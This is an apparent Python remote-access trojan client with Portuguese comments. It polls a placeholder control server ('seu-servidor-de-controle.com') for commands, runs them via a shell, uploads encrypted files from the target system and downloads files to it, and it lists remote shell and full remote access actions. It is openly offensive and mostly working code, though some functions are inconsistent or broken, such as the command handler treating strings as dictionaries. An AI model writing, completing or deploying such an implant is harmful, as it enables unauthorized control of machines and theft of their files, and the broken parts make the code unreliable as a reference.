import os
import requests
import pymongo
import socket
import subprocess
import time
from cryptography.fernet import Fernet



# URL do servidor de controle
url = 'http://seu-servidor-de-controle.com/'

# Exemplo de parâmetros de controle para informações do sistema:
params = [
    ('action', 'system_info'),  # Obtém informações sobre o sistema alvo
    ('action', 'process_list'),  # Retorna a lista de processos em execução no sistema
    ('action', 'network_info'),  # Obtém informações sobre a configuração de rede do sistema
    ('action', 'disk_usage'),  # Obtém informações sobre o uso do disco
    ('action', 'memory_usage'),  # Obtém informações sobre o uso de memória
    ('action', 'cpu_usage'),  # Obtém informações sobre o uso da CPU
    ('action', 'logged_users'),  # Obtém a lista de usuários logados no sistema
    ('action', 'installed_software'),  # Obtém a lista de software instalado no sistema
    ('action', 'file_list'),  # Obtém a lista de arquivos em um diretório específico
    ('action', 'system_status'),  # Obtém o status geral do sistema (CPU, memória, disco, etc.)
    ('action', 'execute_command'),  # Executa um comando específico no sistema alvo.
    ('action', 'upload_file'),  # Envia um arquivo para o sistema alvo.
    ('action', 'download_file'),  # Faz o download de um arquivo específico do sistema.
    ('action', 'remote_shell'),  # Inicia um shell remoto no sistema alvo para controle interativo.
    ('action', 'remote_access'),  # Estabelece uma conexão remota com o sistema alvo para acesso completo.
]


# Chave de criptografia (gerada previamente)
with open('taping.txt', 'rb') as encryption_key:
    encryption_key = encryption_key.read()

# Inicializa o objeto Fernet com a chave de criptografia
cipher = Fernet(encryption_key)

# Realiza uma requisição HTTP GET para o servidor de controle
response = requests.get(url, params=params)

# Verifica o código de status da resposta
if response.status_code == 200:
    # A conexão foi estabelecida com sucesso
    print('Conexão estabelecida com o servidor de controle.')
else:
    # A conexão falhou
    print('Falha ao estabelecer conexão com o servidor de controle.')

def encrypt_message(message):
    # Criptografa a mensagem usando a chave de criptografia
    encrypted_message = cipher.encrypt(message.encode())
    return encrypted_message

def decrypt_message(encrypted_message):
    # Descriptografa a mensagem usando a chave de criptografia
    decrypted_message = cipher.decrypt(encrypted_message)
    return decrypted_message.decode()

def get_commands_from_server():
    client = pymongo.MongoClient("mongodb://localhost:27017")
    db = client["nome-do-banco-de-dados"]
    collection = db["nome-da-colecao"]
    
    commands = collection.find()
    
    return list(commands)

def receive_commands_from_server():
    server_ip = "127.0.0.1"  # IP do servidor
    server_port = 8888  # Porta do servidor
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((server_ip, server_port))
        
        while True:
            data = client_socket.recv(1024)
            
            if data:
                decrypted_data = decrypt_message(data)
                commands = decrypted_data.split("\n")
                
                # Processar e executar os comandos recebidos

def fetch_commands_from_server():
    # Faz uma requisição para buscar os comandos do servidor
    response = requests.get('http://localhost:8000/commands')
    
    # Verifica se a requisição foi bem-sucedida
    if response.status_code == 200:
        encrypted_commands = response.content
        decrypted_commands = decrypt_message(encrypted_commands)
        commands = decrypted_commands.split("\n")
        
        # Retorna os comandos encontrados
        return commands
    
    # Caso ocorra algum erro na requisição, retorna None
    return None

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True)
        print(f"Comando executado: {command}")
        print(f"Saída do comando:\n{output.decode()}")
    except subprocess.CalledProcessError as e:
        print(f"Erro ao executar o comando: {command}")
        print(f"Código de retorno: {e.returncode}")
        print(f"Mensagem de erro: {e.output.decode()}")

def process_commands(commands):
    if commands:
        for command in commands:
            # Processa cada comando recebido
            if command['action'] == 'execute_command':
                # Executa o comando
                execute_command(command['command'])
            elif command['action'] == 'other_action':
                # Lógica para processar outro tipo de ação
                pass
            # ...

def upload_file(file_path):
    # Define a URL do endpoint para upload de arquivos no servidor de controle
    url = 'http://seu-servidor-de-controle.com/upload'
    
    try:
        with open(file_path, 'rb') as file:
            # Lê o conteúdo do arquivo
            file_data = file.read()
            
            # Criptografa o conteúdo do arquivo
            encrypted_data = encrypt_message(file_data)
            
            # Envia a solicitação POST com o arquivo criptografado
            response = requests.post(url, data=encrypted_data)
            
            if response.status_code == 200:
                print('Arquivo enviado com sucesso!')
            else:
                print('Falha ao enviar o arquivo.')
    except FileNotFoundError:
        print('Arquivo não encontrado.')

def download_file(file_url, save_path):
    # Define a URL do arquivo no servidor de controle
    url = 'http://seu-servidor-de-controle.com/files/' + file_url
    
    try:
        # Faz o download do arquivo criptografado
        response = requests.get(url)
        
        if response.status_code == 200:
            # Descriptografa o conteúdo do arquivo
            encrypted_data = response.content
            decrypted_data = decrypt_message(encrypted_data)
            
            with open(save_path, 'wb') as file:
                file.write(decrypted_data)
            
            print('Arquivo baixado com sucesso!')
        else:
            print('Falha ao baixar o arquivo.')
    except requests.exceptions.RequestException:
        print('Erro ao fazer a solicitação de download.')

# Exemplo de uso
file_to_upload = '/caminho/para/arquivo.txt'
upload_file(file_to_upload)

file_to_download = 'nome_do_arquivo.txt'
save_path = '/caminho/para/salvar/o/arquivo.txt'
download_file(file_to_download, save_path)

while True:
    # Busca os comandos do servidor
    commands = fetch_commands_from_server()
    
    # Processa os comandos recebidos
    process_commands(commands)
    
    # Aguarda um intervalo antes de fazer uma nova requisição
    time.sleep(60)